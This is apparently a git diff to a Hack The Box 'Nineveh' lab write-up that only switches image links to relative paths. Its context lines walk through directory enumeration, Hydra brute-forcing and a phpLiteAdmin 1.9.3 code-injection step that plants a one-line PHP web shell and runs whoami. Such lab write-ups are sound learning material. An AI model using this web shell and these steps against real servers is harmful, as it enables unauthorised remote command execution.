@@ -44,7 +44,7 @@ gobuster -u http://10.10.10.43/ dir -w /usr/share/wordlists/dirbuster/directory-
 
 It outputs _/department_ path which forwards to _/department/login.php_ with a login form.
 
-![Department login page](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_http-1.png)
+![Department login page](nineveh_http-1.png)
 
 Lets try to brute-force the credentials with **Hydra**:
 ```markdown
@@ -82,7 +82,7 @@ gobuster -u https://10.10.10.43/ dir -w /usr/share/wordlists/dirbuster/directory
 
 It outputs _/db_ path which wants a password for **phpLiteAdmin v1.9** and _/secure_notes_ path which displays an image without additional information.
 
-![phpLiteAdmin login page](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-1.png)
+![phpLiteAdmin login page](nineveh_https-1.png)
 
 Lets try to brute-force the credentials with **Hydra**:
 ```markdown
@@ -103,18 +103,18 @@ The result called _PHPLiteAdmin 1.9.3 - Remote PHP Code Injection_ is a vulnerab
 
 Create new database called _ninevehNotes_:
 
-![phpLiteAdmin create database](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-2.png)
+![phpLiteAdmin create database](nineveh_https-2.png)
 
 Create table with PHP command:
 ```markdown
 <?php echo system($\_REQUEST["cmd"]); ?>
 ```
 
-![phpLiteAdmin create table](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-3.png)
+![phpLiteAdmin create table](nineveh_https-3.png)
 
 Rename the database so it has a PHP extension:
 
-![phpLiteAdmin rename database](https://kyuu-ji.github.io/htb-write-up/nineveh/nineveh_https-4.png)
+![phpLiteAdmin rename database](nineveh_https-4.png)
 
 Now we can browse back to the HTTP page to replace _ninevehNotes.txt_ to _ninevehNotes.php_ and try to execute a `whoami` command.
 ```markdown
